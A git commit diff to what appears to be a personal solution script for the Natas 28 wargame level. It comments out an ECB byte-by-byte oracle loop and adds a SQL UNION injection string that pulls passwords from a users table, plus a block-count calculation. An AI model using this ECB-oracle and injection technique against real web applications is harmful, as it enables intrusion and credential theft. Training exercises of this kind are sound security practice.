8a9460a90f4a5a42be3899b0e40bacd7131b797c
Raymond Nazaryan <rayn2427@gmail.com>
2020-04-21 18:13:24 -0700

    Add missing bytes literal

--- Natas/natas28.py
+++ Natas/natas28.py
@@ -24,17 +24,25 @@ block_size = 16
 # 	for block in range(int(80 / block_size)):
 # 		print("block", block + 1, "data", repr(base64.b64decode(requests.utils.unquote(response.url[60:]))[block * block_size:(block + 1) * block_size]))
 
-import string
+# import string
 
-correct_string = repr(b'\x9eb&\x86\xa5&@YW\x06\t\x9a\xbc\xb0R\xbb')
-for c in string.printable:
-	print("trying", c)
-	response = session.post(url, data = { "query": "a"*9+c }, auth = (username, password))
+# correct_string = repr(b'\x9eb&\x86\xa5&@YW\x06\t\x9a\xbc\xb0R\xbb')
+# for c in string.printable:
+# 	print("trying", c)
+# 	response = session.post(url, data = { "query": "a" * 8 + '%' + c }, auth = (username, password)) # 'shrink' query from 9 to 8 so we can input %
 
-	block = 2 # 0-based
-	answer = repr(base64.b64decode(requests.utils.unquote(response.url[60:]))[block * block_size:(block + 1) * block_size])
-	if answer == correct_string:
-		print("WE FOUND THE CHARACTER", c)
+# 	block = 2 # 0-based
+# 	answer = repr(base64.b64decode(requests.utils.unquote(response.url[60:]))[block * block_size:(block + 1) * block_size])
+# 	if answer == correct_string:
+# 		print("WE FOUND THE CHARACTER", c)
+
+# SELECT text FROM jokes WHERE text LIKE '%inputs%'
+
+injection = 'a'*9 + "' UNION SELECT password FROM users; #"
+
+blocks = (len(injection) - 10) / block_size
+if (len(injection) - 10) % block_size != 0: blocks += 1
+print(blocks)
 
 # print(repr(base64.b64decode(requests.utils.unquote(response.url[60:]))))
 # print(base64.b64decode(requests.utils.unquote(response.url[60:])))
